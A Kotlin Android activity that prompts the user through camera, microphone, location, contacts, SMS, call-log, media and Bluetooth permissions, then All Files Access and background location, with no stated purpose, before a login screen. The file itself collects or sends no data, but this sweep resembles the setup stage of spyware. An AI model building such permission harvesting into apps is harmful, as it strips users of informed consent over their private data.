package com.csk4.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class PermissionActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView
    private lateinit var tvProgress: TextView
    private lateinit var btnNext: Button
    private var currentIndex = 0

    private val permissionList = mutableListOf<Pair<String, String>>(
        Manifest.permission.CAMERA to "📷 Camera",
        Manifest.permission.RECORD_AUDIO to "🎤 Microphone",
        Manifest.permission.ACCESS_FINE_LOCATION to "📍 Fine Location",
        Manifest.permission.ACCESS_COARSE_LOCATION to "📍 Coarse Location",
        Manifest.permission.READ_CONTACTS to "👥 Contacts",
        Manifest.permission.READ_SMS to "💬 SMS",
        Manifest.permission.READ_CALL_LOG to "📞 Call Logs",
        Manifest.permission.VIBRATE to "📳 Vibrate",
        Manifest.permission.ACCESS_WIFI_STATE to "📶 WiFi"
    )

    init {
        if (Build.VERSION.SDK_INT >= 33) {
            permissionList.add(Manifest.permission.POST_NOTIFICATIONS to "🔔 Notifications")
            permissionList.add(Manifest.permission.READ_MEDIA_IMAGES to "🖼️ Images")
            permissionList.add(Manifest.permission.READ_MEDIA_VIDEO to "🎬 Videos")
            permissionList.add(Manifest.permission.READ_MEDIA_AUDIO to "🎵 Audio")
            permissionList.add(Manifest.permission.NEARBY_WIFI_DEVICES to "📡 Nearby WiFi")
        } else {
            permissionList.add(Manifest.permission.READ_EXTERNAL_STORAGE to "📁 Storage")
            permissionList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE to "📁 Write")
        }
        if (Build.VERSION.SDK_INT >= 31) {
            permissionList.add(Manifest.permission.BLUETOOTH_SCAN to "📶 BT Scan")
            permissionList.add(Manifest.permission.BLUETOOTH_CONNECT to "📶 BT Connect")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission)

        tvStatus = findViewById(R.id.tvStatus)
        tvProgress = findViewById(R.id.tvProgress)
        btnNext = findViewById(R.id.btnNext)

        btnNext.setOnClickListener { requestCurrent() }
        showCurrent()
    }

    private fun showCurrent() {
        if (currentIndex >= permissionList.size) {
            requestSpecialPermissions()
            return
        }
        val (_, label) = permissionList[currentIndex]
        tvStatus.text = label
        tvProgress.text = "Permission ${currentIndex + 1} of ${permissionList.size}"
        btnNext.text = "Allow"
    }

    private fun requestCurrent() {
        if (currentIndex >= permissionList.size) {
            requestSpecialPermissions()
            return
        }
        val perm = permissionList[currentIndex].first
        if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
            currentIndex++
            showCurrent()
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(perm), 100 + currentIndex)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        currentIndex++
        showCurrent()
    }

    private fun requestSpecialPermissions() {
        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) {
                Toast.makeText(this, "Please grant All Files Access", Toast.LENGTH_LONG).show()
                try {
                    val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    i.data = Uri.parse("package:$packageName")
                    startActivityForResult(i, 200)
                } catch (e: Exception) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
                return
            }
        }
        if (Build.VERSION.SDK_INT >= 29 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 201)
            return
        }
        goNext()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 200) requestSpecialPermissions()
    }

    private fun goNext() {
        startActivity(Intent(this, LoginActivity::class.java))
        finish()
    }
}